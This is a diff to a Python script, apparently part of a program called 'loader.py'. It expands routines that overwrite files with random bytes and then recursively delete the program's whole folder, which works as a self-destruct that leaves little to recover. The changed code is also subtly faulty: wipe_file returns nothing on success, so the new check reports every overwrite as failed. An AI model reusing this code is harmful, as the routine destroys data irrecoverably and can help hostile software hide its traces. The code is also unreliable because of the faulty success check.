@@ -37,7 +37,9 @@ def wipe_file(file_path, passes=1):
             for i in range(passes):
                 file.seek(0)
                 file.write(os.urandom(length))
-    except:
+        print(f"Wiped - {file_path}")
+    except Exception as e:
+        print(f"Wipe failed - {file_path} - {e}")
         return False
 
 def root_folder(locate_file="loader.py"):
@@ -46,27 +48,55 @@ def root_folder(locate_file="loader.py"):
     while True:
         current_file = os.path.join(current_dir, locate_file)
         if os.path.isfile(current_file):
-            print(f"Found")
+            print(f"Found - {current_file}")
             return current_dir
         
         parent_dir = os.path.abspath(os.path.join(current_dir, os.pardir))
         if parent_dir == current_dir:
-            print(f"Nothing found")
+            print(f"Nothing found, reached end of filesystem")
             return None
         
         current_dir = parent_dir
 
+# def delete_folder(folder_path):
+#     """ Removes whole folder containing program """
+#     try:
+#         for root, dirs, files in os.walk(folder_path, topdown=False):
+#             for name in files:
+#                 file_path = os.path.join(root, name)
+#                 wipe_file(file_path, passes=1)
+#         shutil.rmtree(folder_path)
+#         print(f"Deleted {folder_path}")
+#     except:
+#         return False
+
 def delete_folder(folder_path):
-    """ Removes whole folder containing program """
+    """ Deletes entire folder recursively after overwriting each file """
     try:
         for root, dirs, files in os.walk(folder_path, topdown=False):
             for name in files:
                 file_path = os.path.join(root, name)
-                wipe_file(file_path, passes=1)
-        shutil.rmtree(folder_path)
-        print(f"Deleted {folder_path}")
-    except:
-        return False
+                if not wipe_file(file_path, passes=1):
+                    print(f"[-] Failed to overwrite {file_path}. Continuing deletion...")
+                try:
+                    os.remove(file_path)
+                    print(f"[+] Deleted file: {file_path}")
+                except Exception as e:
+                    print(f"[-] Failed to delete file {file_path}: {e}")
+
+            for dir_name in dirs:
+                dir_path = os.path.join(root, dir_name)
+                try:
+                    os.rmdir(dir_path)
+                    print(f"[+] Deleted directory: {dir_path}")
+                except Exception as e:
+                    print(f"[-] Failed to delete directory {dir_path}: {e}")
+
+        # Finally, remove the root folder
+        shutil.rmtree(folder_path, ignore_errors=False)
+        print(f"[+] Successfully deleted folder: {folder_path}")
+    except Exception as e:
+        print(f"[-] Failed to delete folder {folder_path}: {e}")
 
 def self_destruct(locate_file="loader.py"):
     """ destroy self """
